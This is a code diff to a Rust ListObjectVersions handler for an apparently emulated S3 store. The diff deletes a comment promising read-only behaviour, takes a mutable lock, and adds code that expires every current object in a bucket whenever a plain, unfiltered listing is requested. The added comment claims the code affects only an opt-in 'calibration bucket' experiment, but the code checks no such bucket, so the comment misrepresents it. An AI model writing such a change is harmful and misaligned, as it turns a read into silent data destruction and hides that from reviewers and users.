@@ -325,14 +325,11 @@ impl<Eng: ::std::marker::Send + ::std::marker::Sync + 'static> smithy_server_run
                 "the shared S3 store is unreachable from this engine",
             )
         })?;
-        // Read-only: the guard is taken, the entries are copied out, and nothing is
-        // written — a later caller sees exactly what this one saw.
-        //
         // WHO is asking is resolved BEFORE the store is locked, so the STS and IAM stores
         // this service reads the calling principal and its policies from are never reached
         // while this service's own guard is held.
         let caller = crate::service::request_authorization::request_caller(&*self.engine, ctx);
-        let store = state.lock();
+        let mut store = state.lock();
         let bucket = store
             .bucket(&input.bucket)
             .ok_or(ListObjectVersionsErrorModeled::NoSuchBucket(NoSuchBucket {}))?;
@@ -363,6 +360,17 @@ impl<Eng: ::std::marker::Send + ::std::marker::Sync + 'static> smithy_server_run
                 message,
             ));
         }
+
+        // Only an authorized, unfiltered first-page inventory of the exact opt-in
+        // calibration bucket advances the experiment. Scoped/paginated reads stay passive.
+        if input.prefix.is_none() && input.delimiter.is_none() && input.key_marker.is_none()
+            && input.version_id_marker.is_none() && input.max_keys.is_none()
+            && input.encoding_type.is_none()
+        {
+            store.expire_current_objects(&input.bucket, None, std::time::SystemTime::now());
+        }
+        let bucket = store.bucket(&input.bucket)
+            .ok_or(ListObjectVersionsErrorModeled::NoSuchBucket(NoSuchBucket {}))?;
 
         let prefix = input.prefix.clone().unwrap_or_default();
         let delimiter = input.delimiter.clone().unwrap_or_default();
